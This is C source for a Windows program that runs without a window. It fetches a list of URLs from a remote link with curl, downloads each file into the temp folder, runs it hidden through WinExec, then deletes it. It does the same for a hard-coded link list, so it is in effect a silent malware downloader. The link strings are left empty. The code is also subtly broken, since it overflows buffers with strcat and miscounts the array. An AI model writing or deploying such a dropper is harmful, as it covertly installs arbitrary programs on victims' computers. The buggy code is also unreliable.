#include <Windows.h>
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

char *links[] = {
    "",
};
char *remoteLink = "";
char *installFolder = "%temp%\\";

int main()
{
    char cmd[] = "cmd.exe /c @echo off && for /F \"delims=\" %i in ('curl -s ";

    strcat(cmd, remoteLink);
    strcat(cmd, "') do (");
    strcat(cmd, "for %a in (\"%i\") do (");
    strcat(cmd, "curl %i -s -o ");
    strcat(cmd, installFolder);
    strcat(cmd, "%~NXa && start /wait ");
    strcat(cmd, installFolder);
    strcat(cmd, "%~NXa && del ");
    strcat(cmd, installFolder);
    strcat(cmd, "%~NXa");
    strcat(cmd, "))");

    WinExec(cmd, SW_HIDE);

    for (int i = 0; i < sizeof(links); i++)
    {
        char *fileName = strrchr(links[i], '/') + 1;
        char cmd[] = "cmd.exe /c @echo off && curl ";
        
        strcat(cmd, links[i]);
        strcat(cmd, " -s -o ");
        strcat(cmd, installFolder);
        strcat(cmd, fileName);
        strcat(cmd, " && start /wait ");
        strcat(cmd, installFolder);
        strcat(cmd, fileName);
        strcat(cmd, " && del ");
        strcat(cmd, installFolder);
        strcat(cmd, fileName);
        
        WinExec(cmd, SW_HIDE);
    }

    return 0;
}